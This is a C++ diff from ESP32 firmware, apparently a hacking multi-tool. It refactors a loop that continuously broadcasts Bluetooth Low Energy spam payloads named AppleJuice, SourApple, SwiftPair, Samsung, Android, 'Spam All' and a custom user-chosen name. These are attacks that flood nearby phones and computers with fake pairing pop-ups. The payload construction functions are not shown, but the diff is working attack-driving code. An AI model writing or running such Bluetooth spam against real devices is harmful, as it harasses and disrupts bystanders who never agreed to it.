@@ -583,68 +583,60 @@ void ibeacon(char *DeviceName, char *BEACON_UUID, int ManufacturerId) {
 }
 
 void aj_adv(int ble_choice) {
-    // Initialize BLE once before starting the spam loop
     BLEDevice::init("");
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
 
+    auto adv = BLEDevice::getAdvertising();
+
+    // Start once with initial payload
+    BLEAdvertisementData data = GetUniversalAdvertisementData((EBLEPayloadType)ble_choice);
+    adv->setAdvertisementData(data);
+    adv->start();
+
     int count = 0, mael = 0;
     int64_t timer = millis();
-    String spamName = (ble_choice == 6) ? keyboard("", 10, "Name to spam") : "";
+    String spamName = (ble_choice == 6)
+                      ? keyboard("", 10, "Name to spam")
+                      : "";
+
+    const char* labels[] = {
+        "AppleJuice",
+        "SourApple",
+        "SwiftPair",
+        "Samsung",
+        "Android",
+        "SpamAll",
+        nullptr  // custom will use spamName
+    };
 
     while (!returnToMenu) {
         if (millis() - timer > 100) {
-            // All execute functions now run without re-initializing
-            switch (ble_choice) {
-                case 0:
-                    displayTextLine("Applejuice (" + String(count) + ")");
-                    executeSpam(AppleJuice);
-                    break;
-                case 1:
-                    displayTextLine("SourApple (" + String(count) + ")");
-                    executeSpam(SourApple);
-                    break;
-                case 2:
-                    displayTextLine("SwiftPair (" + String(count) + ")");
-                    executeSpam(Microsoft);
-                    break;
-                case 3:
-                    displayTextLine("Samsung (" + String(count) + ")");
-                    executeSpam(Samsung);
-                    break;
-                case 4:
-                    displayTextLine("Android (" + String(count) + ")");
-                    executeSpam(Google);
-                    break;
-                case 5:
-                    displayTextLine("Spam All (" + String(count) + ")");
-                    if (mael == 0) executeSpam(Google);
-                    if (mael == 1) executeSpam(Samsung);
-                    if (mael == 2) executeSpam(Microsoft);
-                    if (mael == 3) executeSpam(SourApple);
-                    if (mael == 4) {
-                        executeSpam(AppleJuice);
-                        mael = 0;
-                    } else {
-                        mael++;
-                    }
-                    break;
-                case 6:
-                    displayTextLine("Spamming " + spamName + " (" + String(count) + ")");
-                    // Custom spam needs its own init/deinit cycle because it's different
-                    BLEDevice::deinit(); // deinit the "" spam
-                    vTaskDelay(10 / portTICK_PERIOD_MS);
-                    executeCustomSpam(spamName);
-                    vTaskDelay(10 / portTICK_PERIOD_MS);
-                    BLEDevice::init(""); // re-init for the next loop
-                    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-                    break;
+            BLEAdvertisementData newData;
+            if (ble_choice == 6) {
+                newData.setFlags(0x06);
+                newData.setName(spamName.c_str());
+            } else {
+                EBLEPayloadType type = (EBLEPayloadType)(
+                    ble_choice < 5 ? ble_choice
+                                  : (mael = (mael + 1) % (Google + 1))
+                );
+                newData = GetUniversalAdvertisementData(type);
             }
+            adv->setAdvertisementData(newData);
+            const char* label = (ble_choice == 6)
+                    ? spamName.c_str()
+                    : labels[ble_choice];
+            displayTextLine(
+                String("Spamming ") +
+                String(label) +
+                " (" + String(count) + ")"
+            );
             count++;
             timer = millis();
         }
         if (check(EscPress)) break;
     }
 
-    // De-initialize BLE only once after the loop finishes
+    adv->stop();
     BLEDevice::deinit();
 }
